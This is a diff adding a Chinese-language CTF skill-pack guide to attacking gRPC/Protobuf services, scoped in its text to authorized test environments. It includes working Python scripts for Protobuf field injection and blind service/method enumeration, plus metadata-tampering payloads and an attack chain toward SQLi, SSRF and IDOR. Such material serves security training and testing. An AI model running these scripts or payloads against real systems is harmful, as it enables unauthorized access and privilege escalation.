@@ -1,0 +1,287 @@
+# gRPC / Protobuf 攻击
+
+> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/03-injection/grpc-protobuf.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
+> **授权范围**：仅限 CTF 靶场 / AWD 赛场 / 已签署授权的测试环境。任何真实第三方目标、真实凭据、真实支付/生产流量都禁止套用本文流程。
+> **什么时候用**：命中「gRPC / Protobuf / field injection / wire type」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。
+
+## 适用信号
+
+- gRPC
+- Protobuf
+- field injection
+- wire type
+- varint
+- reflection
+- gRPC-Web
+- Protoscope
+- grpc-status
+
+## 前置
+
+- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
+- 工具定位走探测层，别猜路径：
+
+```powershell
+. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
+$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
+& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
+```
+
+- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
+- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。
+- 本文涉及的工具与本机实际状态（探测层 `Resolve-ReverseToolSpec` 于 2026-10-10 实测）：
+
+| 工具 | 本机状态 | 本机命令 / 替代方案 |
+|---|---|---|
+| `playwright` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'playwright').Command ...` → `D:\Tools\Node\playwright.cmd` |
+| `objection` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'objection').Command ...` → `D:\EXE\python\Scripts\objection.exe` |
+| `subfinder` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'subfinder').Command ...` → `D:\Tools\subfinder\subfinder.exe` |
+| `gobuster` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'gobuster').Command ...` → `D:\Tools\gobuster\gobuster.exe` |
+| `mitmdump` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'mitmdump').Command ...` → `D:\EXE\python\Scripts\mitmdump.exe` |
+| `binwalk` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'binwalk').Command ...` → `C:\Users\toti\.cargo\bin\binwalk.exe` |
+| `openssl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'openssl').Command ...` → `C:\Program Files\Git\usr\bin\openssl.exe` |
+| `katana` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'katana').Command ...` → `D:\Tools\katana\katana.exe` |
+| `nuclei` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nuclei').Command ...` → `D:\Tools\nuclei\nuclei.exe` |
+| `python` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'python').Command ...` → `D:\EXE\python\python.exe` |
+| `sqlmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'sqlmap').Command ...` → `D:\Tools\sqlmap\sqlmap.py` |
+| `tshark` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'tshark').Command ...` → `D:\Tools\Wireshark\tshark.exe` |
+| `frida` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'frida').Command ...` → `D:\EXE\python\Scripts\frida.exe` |
+| `httpx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'httpx').Command ...` → `D:\Tools\httpx\httpx.exe` |
+| `naabu` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'naabu').Command ...` → `D:\Tools\naabu\naabu.exe` |
+| `curl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'curl').Command ...` → `C:\WINDOWS\system32\curl.exe` |
+| `dnsx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'dnsx').Command ...` → `D:\Tools\dnsx\dnsx.exe` |
+| `ffuf` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'ffuf').Command ...` → `D:\Tools\ffuf\ffuf.exe` |
+| `nmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nmap').Command ...` → `D:\Tools\nmap\nmap.exe` |
+| `node` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'node').Command ...` → `D:\Tools\Node\node.exe` |
+| `adb` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'adb').Command ...` → `D:\Tools\android\AndroidKiller_fix\bin\adb\adb.exe` |
+| `git` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'git').Command ...` → `C:\Program Files\Git\cmd\git.exe` |
+| `interactsh-client` | 未安装 | OOB 通道需自备回显服务（授权环境内的 VPS + `python -m http.server`）；本机无此工具 |
+| `nuclei-templates` | 随 nuclei 提供 | `nuclei -t <模板目录>`；模板需联网 `-update-templates` |
+
+- 上表中标「未安装」的工具**不要照抄原库的裸命令**：`Get-Command` 查空就下结论是错的，
+  但四级探测 `Available=False` 是结论——此时按替代方案手写脚本，或先装再跑。
+
+
+## 步骤
+
+1. **HTTP/2 path** — `grpc-status`, `:status`, trailer message
+2. **gRPC frame** — 解码是否错位、服务端是否读 body
+3. **Protobuf field** — 业务字段、权限、错误文本
+4. **metadata** — 身份、租户、内部方法可达性
+5. **gRPC-Web** — 浏览器代理是否转发差异
+6. **`0`** — 读业务字段/flag
+7. **`3`** — 反推 schema
+8. **`7/16`** — metadata/token/tenant 差分
+9. **`5/12`** — 换候选字典
+
+## 判据
+
+判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。
+
+- **命中样本** — `INVALID_ARGUMENT` 指向方法存在
+- **失败样本** — 始终 `UNIMPLEMENTED`
+- **命中样本** — 修改字段后响应状态变化
+- **失败样本** — 前端签名或压缩未处理
+- **命中样本** — `AdminService/GetFlag` 等内部方法可见
+- **失败样本** — reflection 被禁，转盲枚举
+- **命中样本** — method 可达性或数据域变化
+- **失败样本** — metadata 被网关固定
+- **命中样本** — 后端新版本接收 unknown field
+- **失败样本** — unknown field 被丢弃
+- **命中样本** — schema 反推成功
+- **失败样本** — 错误统一封装
+- **观察点** — `grpc-status`, `:status`, trailer message
+- **观察点** — 解码是否错位、服务端是否读 body
+
+## 坑
+
+- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
+- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
+- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。
+
+## 相关
+
+- 见本技能 `../../SKILL.md` 的 references 索引。
+
+## 技术正文
+
+> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。
+
+gRPC 题面经常把 Web API 的输入藏进 HTTP/2 frame、metadata 和 Protobuf field number。要先知道“服务端到底解析了哪个字段”，再谈提权、越权、SSRF 或注入。
+
+## 输入信号
+
+| 信号 | 立即动作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| `Content-Type: application/grpc` | 读 `grpc-status` trailer 和 method path | `INVALID_ARGUMENT` 指向方法存在 | 始终 `UNIMPLEMENTED` |
+| gRPC-Web Base64 body | 解 frame + protobuf | 修改字段后响应状态变化 | 前端签名或压缩未处理 |
+| reflection 开启 | 拉 service/method/schema | `AdminService/GetFlag` 等内部方法可见 | reflection 被禁，转盲枚举 |
+| metadata 里有 token/tenant | 单变量改 `authorization/x-tenant` | method 可达性或数据域变化 | metadata 被网关固定 |
+| proto 字段未知 | append field number | 后端新版本接收 unknown field | unknown field 被丢弃 |
+| 错误含 field name/number | fuzz required/oneof/repeated | schema 反推成功 | 错误统一封装 |
+
+## 工作流
+
+```text
+识别 gRPC/gRPC-Web 入口
+  → 枚举 service/method 或拉 reflection
+  → 解 frame/protobuf，建立 baseline hex diff
+  → 逐字段注入/删除/类型变化
+  → metadata、compression、deadline 单变量对比
+  → 用 grpc-status/trailer/业务字段证明命中
+```
+
+## 0. 判定矩阵
+
+| 层 | 变量 | 观察点 |
+|---|---|---|
+| HTTP/2 path | `/pkg.Service/Method` | `grpc-status`, `:status`, trailer message |
+| gRPC frame | compression flag + length | 解码是否错位、服务端是否读 body |
+| Protobuf field | field number + wire type + value | 业务字段、权限、错误文本 |
+| metadata | auth/tenant/debug/deadline | 身份、租户、内部方法可达性 |
+| gRPC-Web | Base64 frame + trailers | 浏览器代理是否转发差异 |
+
+## 1. Frame 与 field 工具
+
+```python
+#!/usr/bin/env python3
+import argparse
+import base64
+import json
+
+def enc_varint(v):
+    out = []
+    while v > 0x7f:
+        out.append((v & 0x7f) | 0x80)
+        v >>= 7
+    out.append(v)
+    return bytes(out)
+
+def field_key(num, wire):
+    return enc_varint((num << 3) | wire)
+
+def inject_varint(msg, num, value):
+    return msg + field_key(num, 0) + enc_varint(value)
+
+def inject_bytes(msg, num, value):
+    b = value.encode() if isinstance(value, str) else value
+    return msg + field_key(num, 2) + enc_varint(len(b)) + b
+
+def grpc_frame(msg, compressed=0):
+    return bytes([compressed]) + len(msg).to_bytes(4, "big") + msg
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--b64", help="grpc-web/base64 frame or raw protobuf")
+    ap.add_argument("--hex", help="raw protobuf hex")
+    ap.add_argument("--field", type=int, required=True)
+    ap.add_argument("--wire", choices=["varint", "bytes"], default="varint")
+    ap.add_argument("--value", required=True)
+    ap.add_argument("--wrap-frame", action="store_true")
+    args = ap.parse_args()
+    raw = bytes.fromhex(args.hex) if args.hex else base64.b64decode(args.b64)
+    if len(raw) > 5 and raw[0] in (0, 1) and int.from_bytes(raw[1:5], "big") == len(raw) - 5:
+        raw = raw[5:]
+    patched = inject_varint(raw, args.field, int(args.value)) if args.wire == "varint" else inject_bytes(raw, args.field, args.value)
+    out = grpc_frame(patched) if args.wrap_frame else patched
+    print(json.dumps({"hex": out.hex(), "base64": base64.b64encode(out).decode(), "diff_tail": out[-32:].hex()}, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
+```
+
+成功样本：只追加一个 field 后，`grpc-status`、业务字段、权限或 flag 响应变化。失败样本：`invalid wire type`、`message length mismatch`、所有 field number 同一错误。
+
+## 2. 盲枚举 service/method
+
+```python
+#!/usr/bin/env python3
+import argparse
+import json
+import requests
+
+SERVICES = ["AuthService", "UserService", "AdminService", "FlagService", "InternalService", "ConfigService"]
+METHODS = ["Login", "GetUser", "ListUsers", "GetFlag", "Admin", "Debug", "UpdateConfig", "Search"]
+
+def call(base, svc, method, token=""):
+    headers = {"Content-Type": "application/grpc", "TE": "trailers"}
+    if token:
+        headers["Authorization"] = token
+    r = requests.post(f"{base.rstrip('/')}/{svc}/{method}", headers=headers, data=b"\x00\x00\x00\x00\x00", timeout=10)
+    return {
+        "service": svc,
+        "method": method,
+        "http": r.status_code,
+        "grpc_status": r.headers.get("grpc-status", ""),
+        "grpc_message": r.headers.get("grpc-message", ""),
+        "sample": r.text[:120],
+    }
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--base", required=True, help="https://host or http://host")
+    ap.add_argument("--token", default="")
+    args = ap.parse_args()
+    for s in SERVICES:
+        for m in METHODS:
+            res = call(args.base, s, m, args.token)
+            if res["grpc_status"] not in ("5", "12") or res["http"] not in (404, 501):
+                print(json.dumps(res, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
+```
+
+判定：
+
+| `grpc-status` | 解释 | 下一步 |
+|---|---|---|
+| `0` | 方法调用成功 | 读业务字段/flag |
+| `3` | 方法存在，参数错误 | 反推 schema |
+| `7/16` | 方法存在但身份不足 | metadata/token/tenant 差分 |
+| `5/12` | 服务或方法不存在 | 换候选字典 |
+
+## 3. Metadata 与 gRPC-Web 差分
+
+| 变量 | Payload | 命中样本 |
+|---|---|---|
+| `authorization` | Bearer/JWT/API key/空值 | 身份或错误位置变化 |
+| `x-tenant-id` | public/admin/internal | 数据域变化 |
+| `x-debug` | `1`, `true` | 错误暴露 field name |
+| `grpc-timeout` | 极小/极大 | 触发不同超时分支 |
+| `x-grpc-web` | browser proxy headers | 代理层与后端差异 |
+
+## 4. Protoscope / hexdiff
+
+```bash
+# 解 gRPC-Web body
+python grpc_field_patch.py --b64 'AAAA...' --field 4 --wire varint --value 1 --wrap-frame
+
+# 可读化 protobuf
+echo '0a0561646d696e' | xxd -r -p | protoscope
+```
+
+保留修改前后 hex diff：`field_key`, `wire_type`, `length`, `value` 必须能复查。
+
+## 攻击链
+
+```text
+gRPC 入口
+  → reflection/盲枚举 service
+  → schema/field number 反推
+  → metadata 与 field 注入
+  → 权限、租户、debug、flag 差异
+  → 转 SQLi/SSRF/JWT/IDOR 下一跳
+```
+
+## Evidence
+
+| 项 | 记录内容 |
+|---|---|
+| 入口 | path、content-type、HTTP/2/gRPC-Web、TLS、代理层 |
+| 枚举 | service/method 候选、grpc-status、grpc-message |
+| protobuf | 原始 frame、hex diff、field number、wire type、value |
+| metadata | header/trailer、token/tenant/deadline 变量 |
+| 成功样本 | 方法可达、权限变化、内部数据、flag、下游注入差异 |
+| 失败样本 | length mismatch、unknown field dropped、统一 status |
+| 下一跳 | 字段注入转 SQLi/SSRF/IDOR；token 转 JWT；服务枚举转 API discovery |
